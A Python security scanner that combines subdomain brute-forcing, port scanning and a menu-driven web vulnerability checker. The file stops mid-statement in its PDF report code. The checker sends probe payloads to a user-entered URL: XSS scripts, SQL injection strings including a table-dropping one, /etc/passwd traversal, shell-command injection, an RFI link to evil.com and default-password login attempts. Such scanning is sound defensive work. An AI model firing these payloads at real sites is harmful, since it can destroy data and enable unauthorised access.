import asyncio
import socket
import ipaddress
import dns.resolver
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import datetime
import os
import sys
import logging
from urllib.parse import urlparse
from docx import Document
from docx.shared import Inches
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# -------------------- Port List --------------------
port_list = [
    7, 9, 13, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 49, 53, 67, 68, 69, 70,
    79, 80, 81, 88, 102, 109, 110, 111, 113, 119, 123, 135, 137, 138, 139, 143,
    161, 162, 177, 179, 194, 389, 443, 445, 464, 465, 500, 512, 513, 514, 515,
    520, 543, 544, 546, 547, 548, 554, 563, 587, 591, 593, 631, 636, 902, 989,
    990, 993, 995, 1080, 1194, 1352, 1433, 1434, 1521, 1701, 1720, 1723, 1812,
    2049, 2082, 2083, 2483, 2484, 3074, 3306, 3389, 3724, 5060, 5061, 5432,
    5900, 6667, 6669, 8000, 8080, 8081, 8088, 8443, 9000, 9090, 9100, 10000
]

# -------------------- Wordlist for Subdomains --------------------
wordlist = [
    'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test', 'staging', 'api', 'cdn',
    'm', 'mobile', 'app', 'webmail', 'secure', 'portal', 'assets', 'static', 'beta',
    'demo', 'shop', 'login', 'vpn', 'docs', 'status', 'support', 'wiki', 'remote',
    'dashboard', 'control', 'panel', 'ns1', 'ns2', 'ns3', 'intranet', 'internal',
    'owa', 'exchange', 'autodiscover', 'pop', 'imap', 'smtp', 'community', 'jobs',
    'careers', 'store', 'billing', 'sso', 'id', 'graphs', 'metrics', 'monitor',
    'analytics', 'data', 'prod', 'preprod', 'qa', 'sales', 'helpdesk', 'jira',
    'confluence', 'gitlab', 'github', 'jenkins', 'backup', 'db', 'sql', 'mysql',
    'redis', 'mongo', 'elastic', 'proxy', 'gateway', 'logs', 'server', 'cluster',
    'balancer', 'router', 'controller', 'manage', 'sys', 'system', 'cloud', 'user',
    'clients', 'partner', 'partnerportal', 'members', 'customer', 'service', 'hr',
    'hrportal', 'events', 'gallery', 'img', 'images', 'video', 'downloads', 'files',
    'res', 'resource', 'media', 'cname', 'alias', 'legacy', 'old', 'new', 'temp'
]

class SecurityScanner:
    def __init__(self):
        self.scan_results = {
            'timestamp': datetime.datetime.now(),
            'target': '',
            'osint_results': {},
            'vulnerability_results': [],
            'errors': []
        }
        self.session = self._create_session()

    def _create_session(self):
        """Create a requests session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            'User-Agent': 'SecurityScanner/1.0 (Educational Purpose)'
        })
        return session

    def validate_target(self, target):
        """Validate and resolve target"""
        try:
            # Check if it's an IP address
            ip_obj = ipaddress.ip_address(target)
            self.scan_results['target'] = str(ip_obj)
            return str(ip_obj), False  # IP, not domain
        except ValueError:
            try:
                # It's a domain, resolve it
                resolved_ip = socket.gethostbyname(target)
                self.scan_results['target'] = target
                print(f"[✓] Domain '{target}' resolved to {resolved_ip}")
                return resolved_ip, True  # IP, is domain
            except socket.gaierror as e:
                error_msg = f"Invalid IP address or domain name: {e}"
                self.scan_results['errors'].append(error_msg)
                print(f"[✗] {error_msg}")
                return None, False

    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False

    async def grab_banner(self, ip, port):
        """Grab banner from service"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=3
            )
            
            # Send HTTP request for web services
            if port in [80, 8080, 8000, 8081, 8088]:
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            else:
                request = "\r\n"
            
            writer.write(request.encode())
            await writer.drain()
            
            banner = await asyncio.wait_for(reader.read(1024), timeout=2)
            writer.close()
            await writer.wait_closed()
            
            return banner.decode(errors='ignore').strip()
        except Exception as e:
            logger.debug(f"Banner grab failed for {ip}:{port} - {e}")
            return None

    async def scan_tcp(self, ip, port):
        """Scan TCP port"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=2
            )
            
            try:
                service = socket.getservbyport(port, 'tcp')
            except OSError:
                service = "Unknown"
            
            banner = await self.grab_banner(ip, port)
            banner_info = f" | Banner: {banner.splitlines()[0][:50]}..." if banner else ""
            
            result = f"Port {port} is open ({service}){banner_info}"
            print(f"[TCP] {result}")
            
            port_info = {
                'port': port,
                'service': service,
                'banner': banner.splitlines()[0][:100] if banner else None,
                'status': 'open'
            }
            
            if 'open_ports' not in self.scan_results['osint_results']:
                self.scan_results['osint_results']['open_ports'] = []
            self.scan_results['osint_results']['open_ports'].append(port_info)
            
            writer.close()
            await writer.wait_closed()
            
        except ConnectionResetError:
            print(f"[TCP] Port {port} connection reset by peer")
        except asyncio.TimeoutError:
            pass  # Port is closed or filtered
        except Exception as e:
            logger.debug(f"TCP scan failed for {ip}:{port} - {e}")

    def fingerprint_os(self, ip):
        """Basic OS fingerprinting using socket options"""
        try:
            # Simple TTL-based fingerprinting
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            try:
                sock.connect((ip, 80))
                # Get socket options if available
                ttl_guess = "Unknown"
                
                # Basic heuristics
                common_ports = [22, 80, 443, 135, 445]
                open_count = 0
                
                for port in common_ports:
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(1)
                    try:
                        result = test_sock.connect_ex((ip, port))
                        if result == 0:
                            open_count += 1
                    except:
                        pass
                    finally:
                        test_sock.close()
                
                if open_count >= 3:
                    os_guess = "Likely Windows (multiple ports open)"
                elif open_count == 1:
                    os_guess = "Likely Linux/Unix (minimal services)"
                else:
                    os_guess = "Unknown (filtered/firewall)"
                
                print(f"[OS] {os_guess}")
                self.scan_results['osint_results']['os_fingerprint'] = os_guess
                
            finally:
                sock.close()
                
        except Exception as e:
            error_msg = f"OS fingerprinting failed: {e}"
            print(f"[OS] {error_msg}")
            self.scan_results['errors'].append(error_msg)

    def enumerate_subdomains(self, domain):
        """Enumerate subdomains"""
        print(f"\n[✓] Starting subdomain enumeration on {domain}...\n")
        found = []
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 5
        
        for sub in wordlist:
            subdomain = f"{sub}.{domain}"
            try:
                answers = resolver.resolve(subdomain, "A")
                for rdata in answers:
                    result = f"Found subdomain: {subdomain} -> {rdata}"
                    print(f"[+] {result}")
                    found.append({'subdomain': subdomain, 'ip': str(rdata)})
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
                continue
            except Exception as e:
                logger.debug(f"DNS lookup failed for {subdomain}: {e}")
                continue
        
        if not found:
            print("[-] No subdomains found.")
        
        self.scan_results['osint_results']['subdomains'] = found
        return found

    def shodan_lookup(self, ip):
        """Shodan API lookup - requires valid API key"""
        print(f"\n[✓] Performing Shodan lookup on {ip}...")
        
        # Check for API key from environment or config
        api_key = os.getenv('SHODAN_API_KEY')
        if not api_key or api_key == "YOUR_SHODAN_API_KEY":
            print("[Shodan] No valid API key found. Skipping Shodan lookup.")
            print("[Shodan] Set SHODAN_API_KEY environment variable to enable this feature.")
            return
        
        url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
        
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                shodan_info = {
                    'ip': data.get('ip_str'),
                    'organization': data.get('org'),
                    'os': data.get('os'),
                    'ports': data.get('ports', []),
                    'vulns': list(data.get('vulns', [])),
                    'last_update': data.get('last_update')
                }
                
                print(f"[Shodan] IP: {shodan_info['ip']}")
                print(f"[Shodan] Organization: {shodan_info['organization']}")
                print(f"[Shodan] OS: {shodan_info['os']}")
                print(f"[Shodan] Open Ports: {shodan_info['ports']}")
                if shodan_info['vulns']:
                    print(f"[Shodan] Known Vulnerabilities: {len(shodan_info['vulns'])}")
                
                self.scan_results['osint_results']['shodan'] = shodan_info
                
            elif response.status_code == 401:
                print("[Shodan] Invalid API key.")
            elif response.status_code == 404:
                print("[Shodan] No information available for this IP.")
            else:
                print(f"[Shodan] Error {response.status_code}: Could not retrieve data.")
                
        except requests.exceptions.RequestException as e:
            error_msg = f"Shodan request failed: {e}"
            print(f"[Shodan] {error_msg}")
            self.scan_results['errors'].append(error_msg)

    async def osint_module(self):
        """Main OSINT scanning module"""
        target = input("Enter IP address or domain: ").strip()
        ip, is_domain = self.validate_target(target)
        if not ip:
            return

        print(f"\n[✓] Starting OSINT scan on {target} ({ip})")
        
        # Subdomain Enumeration (only for domains)
        if is_domain:
            self.enumerate_subdomains(target)

        # OS Fingerprinting
        print(f"\n[✓] Starting OS fingerprinting...")
        self.fingerprint_os(ip)

        # TCP Scan
        print(f"\n[✓] Starting TCP port scan on {ip}...\n")
        await asyncio.gather(*(self.scan_tcp(ip, port) for port in port_list), return_exceptions=True)

        # Shodan Lookup
        self.shodan_lookup(ip)

        print("\n[✓] OSINT scan complete.")

class VulnerabilityScanner:
    def __init__(self, security_scanner):
        self.target_url = ""
        self.vulnerabilities = []
        self.security_scanner = security_scanner

    def set_target_url(self):
        """Set and validate target URL"""
        while True:
            url = input("Enter the URL to scan for vulnerabilities: ").strip()
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            if self.security_scanner.validate_url(url):
                self.target_url = url
                break
            else:
                print("Invalid URL format. Please try again.")

    def safe_request(self, method, url, **kwargs):
        """Make safe HTTP request with error handling"""
        try:
            kwargs.setdefault('timeout', 5)
            kwargs.setdefault('allow_redirects', True)
            
            if method.upper() == 'GET':
                response = self.security_scanner.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                response = self.security_scanner.session.post(url, **kwargs)
            else:
                return None
            
            return response
        except requests.exceptions.RequestException as e:
            logger.debug(f"Request failed for {url}: {e}")
            return None

    def scan(self):
        """Main vulnerability scanning menu"""
        while True:
            self.display_menu()
            choice = input("Enter your choice (1-9): ").strip()
            
            if choice == "1":
                self.scan_xss()
            elif choice == "2":
                self.scan_sql_injection()
            elif choice == "3":
                self.scan_directory_traversal()
            elif choice == "4":
                self.scan_command_injection()
            elif choice == "5":
                self.scan_server_misconfiguration()
            elif choice == "6":
                self.scan_weak_passwords()
            elif choice == "7":
                self.scan_network_vulnerabilities()
            elif choice == "8":
                self.scan_web_application_security()
            elif choice == "9":
                print("Exiting vulnerability scanner...")
                break
            else:
                print("Invalid choice. Please try again.")

    def display_menu(self):
        print("\n" + "="*50)
        print("        Vulnerability Scanner Menu")
        print("="*50)
        print("1. Cross-Site Scripting (XSS)")
        print("2. SQL Injection")
        print("3. Directory Traversal")
        print("4. Command Injection")
        print("5. Server Misconfiguration")
        print("6. Weak Passwords")
        print("7. Network Vulnerabilities")
        print("8. Web Application Security")
        print("9. Exit")
        print("="*50)

    def scan_xss(self):
        """XSS vulnerability scanning"""
        while True:
            self.display_xss_submenu()
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "1":
                self.check_xss_stored()
            elif choice == "2":
                self.check_xss_reflected()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_xss_submenu(self):
        print("\n--- XSS Submenu ---")
        print("1. Stored XSS")
        print("2. Reflected XSS")
        print("3. Go back")

    def check_xss_stored(self):
        """Check for stored XSS vulnerability"""
        self.set_target_url()
        payload = "<script>alert('Stored_XSS_Test')</script>"
        
        response = self.safe_request('POST', self.target_url, data={"comment": payload})
        if response and payload in response.text:
            vuln = {
                'type': 'Stored XSS',
                'severity': 'High',
                'url': self.target_url,
                'payload': payload,
                'description': 'Stored XSS vulnerability allows execution of malicious scripts'
            }
            self.vulnerabilities.append(vuln)
            print("[!] Stored XSS vulnerability found!")
        else:
            print("[✓] No stored XSS vulnerability detected.")

    def check_xss_reflected(self):
        """Check for reflected XSS vulnerability"""
        self.set_target_url()
        payload = "<script>alert('Reflected_XSS_Test')</script>"
        
        response = self.safe_request('GET', f"{self.target_url}?message={payload}")
        if response and payload in response.text:
            vuln = {
                'type': 'Reflected XSS',
                'severity': 'Medium',
                'url': f"{self.target_url}?message={payload}",
                'payload': payload,
                'description': 'Reflected XSS vulnerability allows execution of malicious scripts via URL parameters'
            }
            self.vulnerabilities.append(vuln)
            print("[!] Reflected XSS vulnerability found!")
        else:
            print("[✓] No reflected XSS vulnerability detected.")

    def scan_sql_injection(self):
        """SQL injection vulnerability scanning"""
        while True:
            self.display_sql_injection_submenu()
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "1":
                self.check_sql_injection_get()
            elif choice == "2":
                self.check_sql_injection_post()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_sql_injection_submenu(self):
        print("\n--- SQL Injection Submenu ---")
        print("1. SQL Injection in GET parameters")
        print("2. SQL Injection in POST parameters")
        print("3. Go back")

    def check_sql_injection_get(self):
        """Check for SQL injection in GET parameters"""
        self.set_target_url()
        payloads = ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users;--"]
        
        for payload in payloads:
            response = self.safe_request('GET', f"{self.target_url}?id={payload}")
            if response and any(error in response.text.lower() for error in 
                              ['sql', 'mysql', 'error', 'warning', 'syntax']):
                vuln = {
                    'type': 'SQL Injection (GET)',
                    'severity': 'Critical',
                    'url': f"{self.target_url}?id={payload}",
                    'payload': payload,
                    'description': 'SQL injection vulnerability in GET parameter allows database manipulation'
                }
                self.vulnerabilities.append(vuln)
                print("[!] SQL injection vulnerability found (GET)!")
                return
        
        print("[✓] No SQL injection vulnerability detected in GET parameters.")

    def check_sql_injection_post(self):
        """Check for SQL injection in POST parameters"""
        self.set_target_url()
        payloads = ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users;--"]
        
        for payload in payloads:
            response = self.safe_request('POST', self.target_url, data={"id": payload})
            if response and any(error in response.text.lower() for error in 
                              ['sql', 'mysql', 'error', 'warning', 'syntax']):
                vuln = {
                    'type': 'SQL Injection (POST)',
                    'severity': 'Critical',
                    'url': self.target_url,
                    'payload': payload,
                    'description': 'SQL injection vulnerability in POST parameter allows database manipulation'
                }
                self.vulnerabilities.append(vuln)
                print("[!] SQL injection vulnerability found (POST)!")
                return
        
        print("[✓] No SQL injection vulnerability detected in POST parameters.")

    def scan_directory_traversal(self):
        """Check for directory traversal vulnerability"""
        self.set_target_url()
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        for payload in payloads:
            response = self.safe_request('GET', f"{self.target_url}/{payload}")
            if response and any(indicator in response.text.lower() for indicator in 
                              ['root:x:', '[drivers]', 'localhost']):
                vuln = {
                    'type': 'Directory Traversal',
                    'severity': 'High',
                    'url': f"{self.target_url}/{payload}",
                    'payload': payload,
                    'description': 'Directory traversal vulnerability allows access to system files'
                }
                self.vulnerabilities.append(vuln)
                print("[!] Directory traversal vulnerability found!")
                return
        
        print("[✓] No directory traversal vulnerability detected.")

    def scan_command_injection(self):
        """Check for command injection vulnerability"""
        self.set_target_url()
        payloads = [
            "127.0.0.1; ls",
            "127.0.0.1 && dir",
            "127.0.0.1 | whoami"
        ]
        
        for payload in payloads:
            response = self.safe_request('GET', f"{self.target_url}?ip={payload}")
            if response and any(indicator in response.text.lower() for indicator in 
                              ['index.html', 'readme', 'bin', 'usr', 'administrator']):
                vuln = {
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'url': f"{self.target_url}?ip={payload}",
                    'payload': payload,
                    'description': 'Command injection vulnerability allows execution of system commands'
                }
                self.vulnerabilities.append(vuln)
                print("[!] Command injection vulnerability found!")
                return
        
        print("[✓] No command injection vulnerability detected.")

    def scan_server_misconfiguration(self):
        """Check for server misconfiguration"""
        self.set_target_url()
        paths = ["/admin", "/.env", "/config", "/backup", "/.git"]
        
        for path in paths:
            response = self.safe_request('GET', f"{self.target_url}{path}")
            if response and response.status_code == 200:
                vuln = {
                    'type': 'Server Misconfiguration',
                    'severity': 'Medium',
                    'url': f"{self.target_url}{path}",
                    'payload': path,
                    'description': f'Sensitive path {path} is accessible without authentication'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Server misconfiguration found: {path} accessible!")
        
        if not any(vuln['type'] == 'Server Misconfiguration' for vuln in self.vulnerabilities):
            print("[✓] No server misconfiguration detected.")

    def scan_weak_passwords(self):
        """Check for weak password vulnerability"""
        self.set_target_url()
        credentials = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("root", "root"), ("user", "user"), ("test", "test")
        ]
        
        for username, password in credentials:
            response = self.safe_request('POST', f"{self.target_url}/login", 
                                       data={"username": username, "password": password})
            if response and any(success in response.text.lower() for success in 
                              ['welcome', 'dashboard', 'successful', 'logged in']):
                vuln = {
                    'type': 'Weak Password',
                    'severity': 'High',
                    'url': f"{self.target_url}/login",
                    'payload': f"{username}:{password}",
                    'description': f'Weak credentials allow unauthorized access: {username}:{password}'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Weak password found: {username}:{password}")
                return
        
        print("[✓] No weak password vulnerability detected.")

    def scan_network_vulnerabilities(self):
        """Network vulnerability scanning submenu"""
        while True:
            self.display_network_vulnerabilities_submenu()
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "1":
                self.check_open_ports()
            elif choice == "2":
                self.check_insecure_cookies()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_network_vulnerabilities_submenu(self):
        print("\n--- Network Vulnerabilities Submenu ---")
        print("1. Open Ports")
        print("2. Insecure Cookies")
        print("3. Go back")

    def check_open_ports(self):
        """Check for open ports (basic check)"""
        self.set_target_url()
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.hostname
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432]
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    open_ports.append(port)
            except Exception:
                pass
            finally:
                sock.close()
        
        if open_ports:
            vuln = {
                'type': 'Open Ports',
                'severity': 'Low',
                'url': self.target_url,
                'payload': str(open_ports),
                'description': f'Open ports detected: {open_ports}'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] Open ports found: {open_ports}")
        else:
            print("[✓] No unusual open ports detected.")

    def check_insecure_cookies(self):
        """Check for insecure cookie configuration"""
        self.set_target_url()
        
        response = self.safe_request('GET', self.target_url)
        if response:
            cookies = response.cookies
            insecure_cookies = []
            
            for cookie in cookies:
                if not cookie.secure or not getattr(cookie, 'has_nonstandard_attr', lambda x: False)('HttpOnly'):
                    insecure_cookies.append(cookie.name)
            
            if insecure_cookies:
                vuln = {
                    'type': 'Insecure Cookies',
                    'severity': 'Medium',
                    'url': self.target_url,
                    'payload': str(insecure_cookies),
                    'description': f'Insecure cookies detected: {insecure_cookies}'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Insecure cookies found: {insecure_cookies}")
            else:
                print("[✓] No insecure cookies detected.")
        else:
            print("[✗] Could not retrieve cookies for analysis.")

    def scan_web_application_security(self):
        """Web application security scanning submenu"""
        while True:
            self.display_web_application_security_submenu()
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "1":
                self.check_cross_site_request_forgery()
            elif choice == "2":
                self.check_remote_file_inclusion()
            elif choice == "3":
                break
            else:
                print("Invalid choice. Please try again.")

    def display_web_application_security_submenu(self):
        print("\n--- Web Application Security Submenu ---")
        print("1. Cross-Site Request Forgery (CSRF)")
        print("2. Remote File Inclusion (RFI)")
        print("3. Go back")

    def check_cross_site_request_forgery(self):
        """Check for CSRF vulnerability"""
        self.set_target_url()
        
        # Check if CSRF tokens are present
        response = self.safe_request('GET', self.target_url)
        if response:
            csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
            has_csrf_protection = any(indicator in response.text.lower() for indicator in csrf_indicators)
            
            if not has_csrf_protection:
                vuln = {
                    'type': 'CSRF',
                    'severity': 'Medium',
                    'url': self.target_url,
                    'payload': 'No CSRF token detected',
                    'description': 'No CSRF protection detected - forms may be vulnerable to cross-site request forgery'
                }
                self.vulnerabilities.append(vuln)
                print("[!] Potential CSRF vulnerability - no CSRF tokens detected!")
            else:
                print("[✓] CSRF protection appears to be in place.")
        else:
            print("[✗] Could not analyze CSRF protection.")

    def check_remote_file_inclusion(self):
        """Check for RFI vulnerability"""
        self.set_target_url()
        payloads = [
            "http://evil.com/malicious.txt",
            "https://pastebin.com/raw/test",
            "file:///etc/passwd"
        ]
        
        for payload in payloads:
            response = self.safe_request('GET', f"{self.target_url}?file={payload}")
            if response and any(indicator in response.text.lower() for indicator in 
                              ['include', 'require', 'root:x:', 'malicious']):
                vuln = {
                    'type': 'Remote File Inclusion',
                    'severity': 'Critical',
                    'url': f"{self.target_url}?file={payload}",
                    'payload': payload,
                    'description': 'RFI vulnerability allows inclusion of remote malicious files'
                }
                self.vulnerabilities.append(vuln)
                print("[!] Remote File Inclusion vulnerability found!")
                return
        
        print("[✓] No Remote File Inclusion vulnerability detected.")

    def report_vulnerabilities(self):
        """Display vulnerability report"""
        print("\n" + "="*60)
        print("              VULNERABILITY REPORT")
        print("="*60)
        
        if self.vulnerabilities:
            print(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
            print()
            
            # Group by severity
            critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
            high = [v for v in self.vulnerabilities if v['severity'] == 'High']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
            low = [v for v in self.vulnerabilities if v['severity'] == 'Low']
            
            for severity, vulns in [('Critical', critical), ('High', high), ('Medium', medium), ('Low', low)]:
                if vulns:
                    print(f"\n{severity} Severity ({len(vulns)}):")
                    print("-" * 30)
                    for vuln in vulns:
                        print(f"• {vuln['type']}")
                        print(f"  URL: {vuln['url']}")
                        print(f"  Description: {vuln['description']}")
                        print()
            
            # Store results for report generation
            self.security_scanner.scan_results['vulnerability_results'] = self.vulnerabilities
            
        else:
            print("No vulnerabilities found - great job on security!")

class ReportGenerator:
    def __init__(self, scan_results):
        self.scan_results = scan_results
        self.timestamp = scan_results['timestamp'].strftime("%Y-%m-%d_%H-%M-%S")

    def generate_docx_report(self):
        """Generate DOCX report"""
        try:
            doc = Document()
            
            # Title
            title = doc.add_heading('Security Scan Report', 0)
            title.alignment = 1  # Center alignment
            
            # Metadata
            doc.add_heading('Scan Information', level=1)
            info_table = doc.add_table(rows=3, cols=2)
            info_table.style = 'Table Grid'
            
            info_table.cell(0, 0).text = 'Target'
            info_table.cell(0, 1).text = str(self.scan_results['target'])
            info_table.cell(1, 0).text = 'Scan Date'
            info_table.cell(1, 1).text = self.scan_results['timestamp'].strftime("%Y-%m-%d %H:%M:%S")
            info_table.cell(2, 0).text = 'Report Generated'
            info_table.cell(2, 1).text = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # OSINT Results
            if self.scan_results['osint_results']:
                doc.add_heading('OSINT Results', level=1)
                
                # Open Ports
                if 'open_ports' in self.scan_results['osint_results']:
                    doc.add_heading('Open Ports', level=2)
                    ports_table = doc.add_table(rows=1, cols=4)
                    ports_table.style = 'Table Grid'
                    
                    hdr_cells = ports_table.rows[0].cells
                    hdr_cells[0].text = 'Port'
                    hdr_cells[1].text = 'Service'
                    hdr_cells[2].text = 'Status'
                    hdr_cells[3].text = 'Banner'
                    
                    for port_info in self.scan_results['osint_results']['open_ports']:
                        row_cells = ports_table.add_row().cells
                        row_cells[0].text = str(port_info['port'])
                        row_cells[1].text = port_info['service']
                        row_cells[2].text = port_info['status']
                        row_cells[3].text = port_info['banner'][:50] if port_info['banner'] else 'N/A'
                
                # Subdomains
                if 'subdomains' in self.scan_results['osint_results'] and self.scan_results['osint_results']['subdomains']:
                    doc.add_heading('Discovered Subdomains', level=2)
                    sub_table = doc.add_table(rows=1, cols=2)
                    sub_table.style = 'Table Grid'
                    
                    hdr_cells = sub_table.rows[0].cells
                    hdr_cells[0].text = 'Subdomain'
                    hdr_cells[1].text = 'IP Address'
                    
                    for sub_info in self.scan_results['osint_results']['subdomains']:
                        row_cells = sub_table.add_row().cells
                        row_cells[0].text = sub_info['subdomain']
                        row_cells[1].text = sub_info['ip']
                
                # OS Fingerprint
                if 'os_fingerprint' in self.scan_results['osint_results']:
                    doc.add_heading('OS Fingerprinting', level=2)
                    doc.add_paragraph(self.scan_results['osint_results']['os_fingerprint'])
                
                # Shodan Results
                if 'shodan' in self.scan_results['osint_results']:
                    doc.add_heading('Shodan Intelligence', level=2)
                    shodan = self.scan_results['osint_results']['shodan']
                    doc.add_paragraph(f"Organization: {shodan.get('organization', 'N/A')}")
                    doc.add_paragraph(f"Operating System: {shodan.get('os', 'N/A')}")
                    doc.add_paragraph(f"Open Ports: {', '.join(map(str, shodan.get('ports', [])))}")
                    if shodan.get('vulns'):
                        doc.add_paragraph(f"Known Vulnerabilities: {len(shodan['vulns'])}")
            
            # Vulnerability Results
            if self.scan_results['vulnerability_results']:
                doc.add_heading('Vulnerability Assessment', level=1)
                
                # Summary
                vulns = self.scan_results['vulnerability_results']
                critical = len([v for v in vulns if v['severity'] == 'Critical'])
                high = len([v for v in vulns if v['severity'] == 'High'])
                medium = len([v for v in vulns if v['severity'] == 'Medium'])
                low = len([v for v in vulns if v['severity'] == 'Low'])
                
                doc.add_heading('Vulnerability Summary', level=2)
                summary_table = doc.add_table(rows=5, cols=2)
                summary_table.style = 'Table Grid'
                
                summary_table.cell(0, 0).text = 'Total Vulnerabilities'
                summary_table.cell(0, 1).text = str(len(vulns))
                summary_table.cell(1, 0).text = 'Critical'
                summary_table.cell(1, 1).text = str(critical)
                summary_table.cell(2, 0).text = 'High'
                summary_table.cell(2, 1).text = str(high)
                summary_table.cell(3, 0).text = 'Medium'
                summary_table.cell(3, 1).text = str(medium)
                summary_table.cell(4, 0).text = 'Low'
                summary_table.cell(4, 1).text = str(low)
                
                # Detailed Vulnerabilities
                doc.add_heading('Detailed Findings', level=2)
                vuln_table = doc.add_table(rows=1, cols=4)
                vuln_table.style = 'Table Grid'
                
                hdr_cells = vuln_table.rows[0].cells
                hdr_cells[0].text = 'Vulnerability'
                hdr_cells[1].text = 'Severity'
                hdr_cells[2].text = 'URL'
                hdr_cells[3].text = 'Description'
                
                for vuln in vulns:
                    row_cells = vuln_table.add_row().cells
                    row_cells[0].text = vuln['type']
                    row_cells[1].text = vuln['severity']
                    row_cells[2].text = vuln['url'][:50] + '...' if len(vuln['url']) > 50 else vuln['url']
                    row_cells[3].text = vuln['description'][:100] + '...' if len(vuln['description']) > 100 else vuln['description']
            
            # Errors
            if self.scan_results['errors']:
                doc.add_heading('Scan Errors', level=1)
                for error in self.scan_results['errors']:
                    doc.add_paragraph(f"• {error}")
            
            # Save document
            filename = f"Security_Scan_Report_{self.timestamp}.docx"
            doc.save(filename)
            print(f"[✓] DOCX report saved as: {filename}")
            return filename
            
        except Exception as e:
            print(f"[✗] Error generating DOCX report: {e}")
            return None

    def generate_pdf_report(self):
        """Generate PDF report"""
        try:
            filename = f"Security_Scan_Report_{self.timestamp}.pdf"
            doc = SimpleDocTemplate(filename, pagesize=letter)
            styles = getSampleStyleSheet()
            story = []
            
            # Custom styles
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=18,
                spaceAfter=30,
                alignment=1
            )
            
            # Title
            story.append(Paragraph("Security Scan Report", title_style))
            story.append(Spacer(1, 20))
            
            # Scan Information
            story.append(Paragraph("Scan Information", styles['Heading2']))
            info_data = [
                ['Target', str(self.scan_results['target'])],
                ['Scan Date', self.scan_results['timestamp'].strftime("%Y-%m-%d %H:%M:%S")],
                ['Report Generated', datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")]
            ]
            info_table = Table(info_data)
            info_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 14),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(info_table)
            story.append(Spacer(1, 20))
            
            # OSINT Results
            if self.scan_results['osint_results']:
                story.append(Paragraph("OSINT Results", styles['Heading2']))
                
                # Open Ports
                if 'open_ports' in self.scan_results['osint_results']:
                    story.append(Paragraph("Open Ports", styles['Heading3']))
                    ports_data = [['Port', 'Service', 'Status', 'Banner']]
                    for port_info in self.scan_results['osint_results']['open_ports']:
                        ports_data.append([
                            str(port_info['port']),
                            port_info['service'],
                            port_info['status'],
                            (port_info['banner'][:30] + '...') if port_info['banner'] and len(port_info['banner']) > 30 else (port_info['banner'] or 'N/A')
                        ])
                    
                    ports_table = Table(ports_data)
                    ports_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
